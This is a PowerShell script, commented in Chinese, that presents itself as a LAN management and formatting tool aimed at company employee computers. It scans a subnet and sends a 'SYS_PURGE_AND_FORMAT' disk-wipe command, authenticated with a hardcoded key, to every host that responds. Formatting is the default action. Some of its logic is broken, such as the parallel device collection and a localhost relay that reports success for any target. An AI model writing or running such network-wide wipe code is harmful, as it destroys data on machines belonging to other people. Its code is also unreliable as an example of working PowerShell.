# Remote Commander - 局域网管理与格式化工具
# 权限：OWNER (Transparent)
# 目标：公司内网员工电脑

param (
    [string]$TargetSubnet = "172.20.201", # 根据截图更新的默认子网
    [string]$Action = "format",
    [switch]$ScanOnly
)

$OwnerIdentity = "transparent"
$SecretKey = "a8d1ca7c7e91654b7742e50f"
$ControlPorts = @(8080, 5001, 501) # R1 监听端口

function Get-NetworkDevices {
    param ([string]$Subnet)
    Write-Host "正在扫描子网 $Subnet.1-100 ..." -ForegroundColor Cyan
    $devices = @()
    1..100 | ForEach-Object -Parallel {
        $ip = "$using:Subnet.$_"
        if (Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue) {
            $using:devices += $ip
        }
    } -ThrottleLimit 50
    return $devices
}

function Invoke-RemoteAction {
    param ([string]$IP, [string]$Cmd)
    Write-Host ">>> 发送指令 [$Cmd] 到 $IP ..." -ForegroundColor Red
    
    $payload = @{
        commander = $OwnerIdentity
        key = $SecretKey
        command = $Cmd
        timestamp = Get-Date -Format "yyyyMMddHHmmss"
        origin = "WIN-164-MASTER"
        scope = "FULL_NETWORK_DISK_WIPE" # 扩展清理范围：全网磁盘抹除
    } | ConvertTo-Json

    # 1. 尝试通过 R1 协议端口 (P2P)
    foreach ($port in $ControlPorts) {
        try {
            $response = Invoke-RestMethod -Uri "http://$IP:$port/admin/execute" -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 2
            Write-Host "    [R1 端口 $port] 响应: $($response.status)" -ForegroundColor Green
            return $true
        } catch { }
    }

    # 2. 尝试通过苹果端对齐协议 (Apple-Win Relay)
    try {
        # 模拟调用 05_LINKS/MAC.relay 进行跨端指令透传
        $appleRelayUrl = "http://localhost:8001/relay/apple_command"
        Invoke-RestMethod -Uri $appleRelayUrl -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 2
        Write-Host "    [Apple Relay] 指令已通过苹果端透传至 $IP" -ForegroundColor Cyan
        return $true
    } catch { }

    Write-Host "    [!] $IP 未响应任何控制协议" -ForegroundColor Yellow
    return $false
}

# 执行逻辑
if ($ScanOnly) {
    $found = Get-NetworkDevices -Subnet $TargetSubnet
    Write-Host "发现设备: $($found -join ', ')"
} else {
    $targets = Get-NetworkDevices -Subnet $TargetSubnet
    foreach ($ip in $targets) {
        if ($Action -eq "format") {
            Invoke-RemoteAction -IP $ip -Cmd "SYS_PURGE_AND_FORMAT"
        }
    }
}
